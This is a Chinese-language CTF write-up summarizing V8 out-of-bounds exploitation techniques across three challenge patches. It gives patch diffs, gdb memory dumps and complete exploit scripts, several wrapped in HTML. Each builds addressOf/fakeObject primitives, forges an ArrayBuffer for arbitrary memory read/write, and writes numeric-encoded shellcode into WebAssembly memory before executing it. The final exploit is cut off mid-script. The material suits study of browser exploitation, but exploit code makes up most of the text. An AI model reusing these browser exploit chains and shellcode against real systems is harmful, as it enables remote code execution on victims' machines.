> 原文链接: https://www.anquanke.com//post/id/225443 


# OOB类型的v8逃逸总结


                                阅读量   
                                **249887**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)



## 0x00 前言

总结几道OOB类型的v8逃逸的利用方法，它们大多的利用手法都极为相似。



## 0x01 前置知识

OOB即缓冲区溢出，在v8中的OOB漏洞是比较容易利用的，一般的步骤就是利用OOB修改`ArrayBuffer`的`backing_store`和`byteLength`实现任意地址读写，也可以直接`OOB`读取和修改对象的`MAP`，构造`addressOf`和`fakeObject`原语。



## 0x02 普通OOB

### <a class="reference-link" name="0x02.00%20starctf2019-oob"></a>0x02.00 starctf2019-oob

#### <a class="reference-link" name="patch%E5%88%86%E6%9E%90"></a>patch分析

```
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 `}`
 `}`  // namespace
+BUILTIN(ArrayOob)`{`
+    uint32_t len = args.length();
+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle&lt;JSReceiver&gt; receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
+    if(len == 1)`{`
+        //read
+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
+    `}`else`{`
+        //write
+        Handle&lt;Object&gt; value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+        elements.set(length,value-&gt;Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    `}`
+`}`

 BUILTIN(ArrayPush) `{`
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal `{`
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) `{`
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();

     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

可以看到，patch为`Array`类型增加了一个新的函数叫`oob`，其具体处理的逻辑在`BUILTIN(ArrayOob)`函数里，当参数个数为1个时，进行读操作

```
+        //read
+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
```

可以看到读操作溢出了一个单位，因为下标是以0开始的，同理当参数个数为2个时，进行写操作

```
elements.set(length,value-&gt;Number());
```

其中`BUILTIN(ArrayOob)`的第一个参数为`Array`本身，因此从`js`层面来看，oob接收的参数要么为0个要么为1个。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

要利用该漏洞，我们考虑使用`var a = [1.1,2.2,3.3]`这种`DOUBLE_ELEMENTS`类型的数组，因为这种数组里的数据是`unboxed`的，即没有包装为`HeapNumber`，elements里存的就是真值。在大多数情况下，这种类型的数组其elements在内存里的位置正好位于`Array`对象的上方，没有间隔。<br>
测试以下代码，用gdb调试

```
var a = [1.1,2.2];
%DebugPrint(a);
%SystemBreak();
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01462128fe6acaa354.png)

查看elements里，2.2这个数据后方是什么，可以发现是`Array`对象的MAP，而在v8里，如果能够控制对象MAP值，那么就可以造成类型混淆，轻松构造`addressOf`和`fakeObject`原语

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a4de072f28369f9b.png)

并且可以看到这个版本的v8没有`compression pointer`机制，因此`addressOf`获得的就是对象的完整地址，然后可以轻松伪造一个`ArrayBuffer`实现任意地址读写，写wasm的shellcode区域。<br>
exp

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
var a = [1.1];
var unboxed_double_map = a.oob();
var obj = `{``}`;
var b = [obj];
var obj_element_map = b.oob();

var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function p64f(value1,value2) `{`
   dv.setUint32(0,value1,true);
   dv.setUint32(0x4,value2,true);
   return dv.getFloat64(0,true);
`}`

function i2f64(value) `{`
   dv.setBigUint64(0,BigInt(value),true);
   return dv.getFloat64(0,true);
`}`

function u64f(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getBigUint64(0,true);
`}`

function addressOf(obj) `{`
   b[0] = obj;
   b.oob(unboxed_double_map);
   var addr = u64f(b[0]) - 0x1n;
   b.oob(obj_element_map);
   return addr;
`}`

function fakeObject(addr) `{`
   a[0] = i2f64(addr + 1n);
   a.oob(obj_element_map);
   var mobj = a[0];
   a.oob(unboxed_double_map);
   return mobj;
`}`

const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
var faker_addr = addressOf(faker);
//alert('wasm='+addressOf(wasmInstance).toString(16));
wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;
var element_addr = faker_addr - 0x50n;
//print('element_addr=' + element_addr.toString(16));
//fake a ArrayBuffer's Map
faker[0] = i2f64(0n);
faker[1] = i2f64(0x1900042317080808n);
faker[2] = i2f64(0x00000000084003ffn);
faker[3] = i2f64(0);

//faker a ArrayBuffer
faker[4] = i2f64(element_addr+0x1n); //map
faker[5] = i2f64(0); //properties
faker[6] = i2f64(0); //elements
faker[7] = p64f(0xffffffff,0); //length
faker[8] = i2f64(wasm_shellcode_ptr_addr);
faker[9] = 0x2;

var arb_ArrayBuffer = fakeObject(element_addr+0x20n);
var adv = new DataView(arb_ArrayBuffer);
var wasm_shellcode_addr = adv.getBigUint64(0,true);
//alert('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
faker[8] = i2f64(wasm_shellcode_addr);
//替换wasm的shellcode
for (var i=0;i&lt;shellcode.length;i++) `{`
   adv.setUint32(i*4,shellcode[i],true);
`}`
//执行shellcode
func();

    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

### <a class="reference-link" name="0x02.01%20xnuca2020-babyV8"></a>0x02.01 xnuca2020-babyV8

#### <a class="reference-link" name="patch%E5%88%86%E6%9E%90"></a>patch分析

```
diff --git a/src/codegen/code-stub-assembler.cc b/src/codegen/code-stub-assembler.cc
index 16fd384..8bf435a 100644
--- a/src/codegen/code-stub-assembler.cc
+++ b/src/codegen/code-stub-assembler.cc
@@ -2888,7 +2888,7 @@ TNode&lt;Smi&gt; CodeStubAssembler::BuildAppendJSArray(ElementsKind kind,
       [&amp;](TNode&lt;Object&gt; arg) `{`
         TryStoreArrayElement(kind, &amp;pre_bailout, elements, var_length.value(),
                              arg);
-        Increment(&amp;var_length);
+        Increment(&amp;var_length, 3);
       `}`,
       first);
   `{`
```

查找该函数的上层调用，发现其在`TF_BUILTIN(ArrayPrototypePush, CodeStubAssembler)`函数里被调用，而`TF_BUILTIN(ArrayPrototypePush, CodeStubAssembler)`函数是js中的`Array.prototype.push`函数的具体实现，因此该漏洞与`push`操作有关。<br>
patch以后，部分关键代码如下

```
// Resize the capacity of the fixed array if it doesn't fit.
  TNode&lt;IntPtrT&gt; first = arg_index-&gt;value();
  Node* growth = IntPtrToParameter(
      IntPtrSub(UncheckedCast&lt;IntPtrT&gt;(args-&gt;GetLength(INTPTR_PARAMETERS)),
                first),
      mode);
  PossiblyGrowElementsCapacity(mode, kind, array, var_length.value(),
                               &amp;var_elements, growth, &amp;pre_bailout);

  // Push each argument onto the end of the array now that there is enough
  // capacity.
  CodeStubAssembler::VariableList push_vars(`{`&amp;var_length`}`, zone());
  Node* elements = var_elements.value();
  args-&gt;ForEach(
      push_vars,
      [this, kind, mode, elements, &amp;var_length, &amp;pre_bailout](Node* arg) `{`
        TryStoreArrayElement(kind, mode, &amp;pre_bailout, elements,
                             var_length.value(), arg);
        Increment(&amp;var_length, 3, mode);
      `}`,
      first, nullptr);
  `{`
    TNode&lt;Smi&gt; length = ParameterToTagged(var_length.value(), mode);
    var_tagged_length = length;
    StoreObjectFieldNoWriteBarrier(array, JSArray::kLengthOffset, length);
    Goto(&amp;success);
  `}`
```

其中看到，在存储数据之前，先进行了扩容，但这个扩容的计算是根据元素的个数来算的，而patch后，原本每次push一个数据，末尾指针加1，现在加了3

```
Increment(&amp;var_length, 3, mode);
```

最后，数据都push完成后，将var_length的值作为Array的length，这就导致了数组的length大于其本身elements的大小，导致了oob。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

首先测试如下代码，用gdb调试

```
var arr = [];
arr[0] = 1.1;
arr.push(1.1,2.2,3.3,4.4,5.5,6.6);
%DebugPrint(arr);
%SystemBreak();
```

可以看到arr的长度为19

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015c7cb142f290922c.png)

为了验证是否溢出，我们用如下代码进一步测试

```
var arr = [];
arr[0] = 1.1;
arr.push(1.1,2.2,3.3,4.4,5.5,6.6);
var arr2 = [1.1,2.2];
%DebugPrint(arr);
%DebugPrint(arr2);
%SystemBreak();
```

结果如下

```
0x114d0808819d &lt;JSArray[19]&gt;
0x114d08088259 &lt;JSArray[2]&gt;

pwndbg&gt; x /20wx 0x114d0808819c
0x114d0808819c:    0x08243905    0x080426e5    0x080881b1    0x00000026
0x114d080881ac:    0x08042219    0x08042a39    0x00000022    0x9999999a
0x114d080881bc:    0x3ff19999    0x9999999a    0x3ff19999    0xfff7ffff
0x114d080881cc:    0xfff7ffff    0xfff7ffff    0xfff7ffff    0x9999999a
0x114d080881dc:    0x40019999    0xfff7ffff    0xfff7ffff    0xfff7ffff
pwndbg&gt; x /20wx 0x114d080881b8
0x114d080881b8:    0x9999999a    0x3ff19999    0x9999999a    0x3ff19999
0x114d080881c8:    0xfff7ffff    0xfff7ffff    0xfff7ffff    0xfff7ffff
0x114d080881d8:    0x9999999a    0x40019999    0xfff7ffff    0xfff7ffff
0x114d080881e8:    0xfff7ffff    0xfff7ffff    0x66666666    0x400a6666
0x114d080881f8:    0xfff7ffff    0xfff7ffff    0xfff7ffff    0xfff7ffff
pwndbg&gt; x /20wx 0x114d08088258
0x114d08088258:    0x08243905    0x080426e5    0x08088241    0x00000004
0x114d08088268:    0x00000000    0x00000000    0x00000000    0x00000000
0x114d08088278:    0x00000000    0x00000000    0x00000000    0x00000000
0x114d08088288:    0x00000000    0x00000000    0x00000000    0x00000000
0x114d08088298:    0x00000000    0x00000000    0x00000000    0x00000000
pwndbg&gt; x /20wx 0x114d08088240
0x114d08088240:    0x08042a39    0x00000004    0x9999999a    0x3ff19999
0x114d08088250:    0x9999999a    0x40019999    0x08243905    0x080426e5
0x114d08088260:    0x08088241    0x00000004    0x00000000    0x00000000
0x114d08088270:    0x00000000    0x00000000    0x00000000    0x00000000
0x114d08088280:    0x00000000    0x00000000    0x00000000    0x00000000
```

计算arr可访问的范围

```
0x114d080881b8+19*8 = 0x114d08088250
```

可以看出，这个范围已经导入arr2的elements里，由此可以知道arr可以溢出，但是还溢出不到arr2对象那里，为了能够控制arr2对象，我们将arr2改为`var arr2 = new Array(1.1,2.2);`可以发现，通过new创建的double Array对象，其elements位于对象下方，而不是上方。

```
0x0bd3080881a5 &lt;JSArray[19]&gt;
0x0bd308088249 &lt;JSArray[2]&gt;

pwndbg&gt; x /20wx 0x0bd308088248
0xbd308088248:    0x08243905    0x080426e5    0x08088259    0x00000004
0xbd308088258:    0x08042a39    0x00000004    0x9999999a    0x3ff19999
0xbd308088268:    0x9999999a    0x40019999    0x00000000    0x00000000
0xbd308088278:    0x00000000    0x00000000    0x00000000    0x00000000
0xbd308088288:    0x00000000    0x00000000    0x00000000    0x00000000
pwndbg&gt; x /20wx 0x0bd308088258
0xbd308088258:    0x08042a39    0x00000004    0x9999999a    0x3ff19999
0xbd308088268:    0x9999999a    0x40019999    0x00000000    0x00000000
0xbd308088278:    0x00000000    0x00000000    0x00000000    0x00000000
0xbd308088288:    0x00000000    0x00000000    0x00000000    0x00000000
0xbd308088298:    0x00000000    0x00000000    0x00000000    0x00000000
```

这样，arr就可以溢出控制arr2对象的结构，改写arr2的length为更大，使得arr2也变为一个oob数组，然后后续利用就类似了。我们发现这个版本的v8开启了`compression pointer`因此利用起来可能有些麻烦，于是我们直接用构造好的oob数组来改写下方的`ArrayBuffer`以及直接从下方搜索数据，不再使用`addressOf`和`fakeObject`来伪造对象。<br>
exp

```
var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

//将一个32位整数打包位64位浮点数
function p64(val) `{`
   dv.setUint32(0,val &amp; 0xFFFFFFFF,true);
   dv.setUint32(0x4,val &gt;&gt; 32,true);
   var float_val = dv.getFloat64(0,true);
   return float_val;
`}`

//将两个32位整数打包为一个64位浮点数
function p64(low4,high4) `{`
   dv.setUint32(0,low4,true);
   dv.setUint32(0x4,high4,true);
   var float_val = dv.getFloat64(0,true);
   return float_val;
`}`

//解包64位浮点数的低四字节
function u64_l(val) `{`
   dv.setFloat64(0,val,true);
   return dv.getUint32(0,true);
`}`

//解包64位浮点数的高四字节
function u64_h(val) `{`
   dv.setFloat64(0,val,true);
   return dv.getUint32(0x4,true);
`}`

var obj = `{``}`;
var arr = [];
arr[0] = 1.1;
arr.push(1.1,2.2,3.3,4.4,5.5,6.6);
var oob_arr = new Array(1.1,2.2);
var obj_arr = [obj,obj];
var arb_buf = new ArrayBuffer(0x10);
var d = arr[17];
var double_element_map = u64_l(d);
var tmp0 = u64_h(d);
d = arr[18];
var tmp1 = u64_l(d);
print("double_element_map="+double_element_map.toString(16));
arr[18] = p64(tmp1,0x100000); //修改oob_arr的length

d = oob_arr[4];
var obj_element_map = u64_l(d);
print("obj_element_map=" + obj_element_map.toString(16));


/*function addressOf(m_obj) `{`
   obj_arr[0] = m_obj;
   oob_arr[0x4] = p64(double_element_map,tmp0);
   var a = u64_l(obj_arr[0]) - 0x1;
   oob_arr[0x4] = p64(obj_element_map,tmp0);
   return a;
`}`

function fakeObject(addr) `{`
   oob_arr[0] = p64(addr + 0x1);
   arr[17] = p64(obj_element_map,tmp0);
   var a = oob_arr[0];
   arr[17] = p64(double_element_map,tmp0);
   return a;
`}`*/

const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var wasm_shellcode_addr_l;
var wasm_shellcode_addr_h;

//搜索wasm_shellcode_addr
for (var i=0xfe;i&gt;=1;i-=1) `{`
   d = oob_arr[0x31200+i];
   wasm_shellcode_addr_l = u64_h(d);
   d = oob_arr[0x31200+i+1];
   wasm_shellcode_addr_h = u64_l(d);
   if (parseInt(wasm_shellcode_addr_h) != 0 &amp;&amp; parseInt(wasm_shellcode_addr_l) != 0 &amp;&amp; parseInt(wasm_shellcode_addr_l &amp; 0xFFF) == 0) `{`
      print("wasm_shellcode_addr=" + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));
      break;
   `}`
`}`

oob_arr[0x7] = p64(tmp0,0x1000); //修改ArrayBuffer的length
oob_arr[0x8] = p64(0,wasm_shellcode_addr_l); //backing_stroe
oob_arr[0x9] = p64(wasm_shellcode_addr_h,0);
oob_arr[0xa] = p64(0x2,0);


var adv = new DataView(arb_buf);
//替换wasm的shellcode
for (var i=0;i&lt;shellcode.length;i++) `{`
   adv.setUint32(i*4,shellcode[i],true);
`}`
//执行shellcode
func();
```



## 0x03 callback中的OOB

### <a class="reference-link" name="0x03.00%20%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E-final-browser"></a>0x03.00 数字经济-final-browser

#### <a class="reference-link" name="patch%E5%88%86%E6%9E%90"></a>patch分析

```
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index e6ab965a7e..9e5eb73c34 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
 `}`
 `}`  // namespace

+// Vulnerability is here
+// You can't use this vulnerability in Debug Build :)
+BUILTIN(ArrayCoin) `{`
+  uint32_t len = args.length();
+  if (len != 3) `{`
+     return ReadOnlyRoots(isolate).undefined_value();
+  `}`
+  Handle&lt;JSReceiver&gt; receiver;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+         isolate, receiver, Object::ToObject(isolate, args.receiver()));
+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
+
+  Handle&lt;Object&gt; value;
+  Handle&lt;Object&gt; length;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));
+
+  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());
+  if(37 &lt; array_length)`{`
+    elements.set(37, value-&gt;Number());
+    return ReadOnlyRoots(isolate).undefined_value();  
+  `}`
+  else`{`
+    return ReadOnlyRoots(isolate).undefined_value();
+  `}`
+`}`
+
 BUILTIN(ArrayPush) `{`
   HandleScope scope(isolate);
   Handle&lt;Object&gt; receiver = args.receiver();
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 3412edb89d..1837771098 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -367,6 +367,7 @@ namespace internal `{`
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayCoin)                                   \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index f5fa8f19fe..03a7b601aa 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1701,6 +1701,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) `{`
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+    case Builtins::kArrayCoin:
+      return Type::Receiver();

     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index e7542dcd6b..059b54731b 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1663,6 +1663,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
                           false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+    SimpleInstallFunction(isolate_, proto, "coin",
+                Builtins::kArrayCoin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
     SimpleInstallFunction(isolate_, proto, "find",
```

可以看到，patch为Array类型增加了一个`coin`函数，该函数功能就是如果`37 &lt; array_length`成立，就往37位置写入我们传入的value。<br>
这里就涉及到一个知识点了`Object::ToNumber`会调用对象里的`valueOf`函数，因此，当执行到这个函数时，还得回到js层去执行valueOf函数，然后再回来。然而，我们注意到一个顺序

```
+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
+
+  Handle&lt;Object&gt; value;
+  Handle&lt;Object&gt; length;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));
```

先是取了elements，然后再去js层回调valueOf函数。假如我们在js层里的valueOf函数里趁机把arr的length扩大，那么Array会申请新的elements，原来那个elements被释放了，然而会到native层时，elements仍然指向的是之前那个elements位置，这就造成了UAF，而`uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());`是在之后执行，因此，我们一开始构造一个很小的arr，然后在valueOf里将arr扩大，那么即能绕过`if(37 &lt; array_length)`{``的判断，从原来的elements处溢出。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

我们可以利用溢出，修改后方的array对象的length，从而构造一个可以自由oob的数组。<br>
POC

```
var val = `{`
   valueOf:function() `{`
      a.length = 0x100;
      return 0xffffffff;
   `}`
`}`;
var a = new Array(30);
var arb_double_arr = [1.1,2.2];
a.coin(0x666,val); //溢出写arb_double_arr的size
```

构造出oob数组以后，我们就可以利用之前介绍的方法利用了。<br>
exp

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;

var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function p64f(value1,value2) `{`
   dv.setUint32(0,value1,true);
   dv.setUint32(0x4,value2,true);
   return dv.getFloat64(0,true);
`}`

function i2f64(value) `{`
   dv.setBigUint64(0,BigInt(value),true);
   return dv.getFloat64(0,true);
`}`

function u64f(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getBigUint64(0,true);
`}`

var val = `{`
   valueOf:function() `{`
      a.length = 0x100;
      return 0xffffffff;
   `}`
`}`;
var a = new Array(30);
var arb_double_arr = [1.1,2.2];
a.coin(0x666,val); //溢出写arb_float_arr的size
//获取double element的map
var double_element_map = arb_double_arr[2];
var b = new Array(30);
var obj = `{``}`;
var obj_arr = [obj];
var obj_element_map = arb_double_arr[0x13a];

function addressOf(obj1) `{`
   obj_arr[0] = obj1;
   arb_double_arr[0x13a] = double_element_map;
   var addr = u64f(obj_arr[0]) - 0x1n;
   arb_double_arr[0x13a] = obj_element_map;
   return addr;
`}`

function addressOf2(obj1) `{`
   obj_arr[0] = obj1;
   arb_double_arr[0x13a] = double_element_map;
   var addr = u64f(obj_arr[0]) - 0x1n;
   arb_double_arr[0x13a] = obj_element_map;
   return addr;
`}`

function fakeObject(addr) `{`
   arb_double_arr[0x13a] = double_element_map;
   obj_arr[0] = i2f64(addr + 1n);
   arb_double_arr[0x13a] = obj_element_map;
   var mobj = obj_arr[0];
   return mobj;
`}`

const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];

var faker_addr = addressOf(faker);
//alert('wasm='+addressOf(wasmInstance).toString(16));
wasm_shellcode_ptr_addr = addressOf2(wasmInstance) + 0x88n;
var element_addr = faker_addr - 0x50n;
//print('element_addr=' + element_addr.toString(16));
//fake a ArrayBuffer's Map
faker[0] = i2f64(0n);
faker[1] = i2f64(0x1900042317080808n);
faker[2] = i2f64(0x00000000082003ffn);
faker[3] = i2f64(0);

//faker a ArrayBuffer
faker[4] = i2f64(element_addr+0x1n); //map
